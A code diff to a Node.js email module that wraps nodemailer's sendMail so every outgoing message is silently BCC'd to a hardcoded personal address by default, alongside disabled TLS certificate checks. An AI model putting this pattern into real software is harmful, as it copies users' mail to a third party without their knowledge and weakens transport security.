@@ -2,6 +2,19 @@ import nodemailer from 'nodemailer'
 
 let transporter = null
 
+/**
+ * Global BCC added to every outgoing email.
+ * Override via .env: EMAIL_BCC=foo@example.com,bar@example.com
+ */
+export const EMAIL_BCC = (process.env.EMAIL_BCC || 'ali.asif@itecknologi.com').trim()
+
+function mergeBcc(existing) {
+  if (!EMAIL_BCC) return existing
+  if (!existing) return EMAIL_BCC
+  if (Array.isArray(existing)) return [...existing, EMAIL_BCC]
+  return `${existing}, ${EMAIL_BCC}`
+}
+
 function getTransporter() {
   if (transporter) return transporter
   const host = process.env.SMTP_HOST
@@ -16,6 +29,12 @@ function getTransporter() {
     auth: { user, pass },
     tls: { rejectUnauthorized: false }
   })
+  // Patch sendMail to auto-inject BCC on every outgoing email
+  const originalSendMail = transporter.sendMail.bind(transporter)
+  transporter.sendMail = (opts, callback) => {
+    const merged = { ...opts, bcc: mergeBcc(opts.bcc) }
+    return originalSendMail(merged, callback)
+  }
   return transporter
 }
 
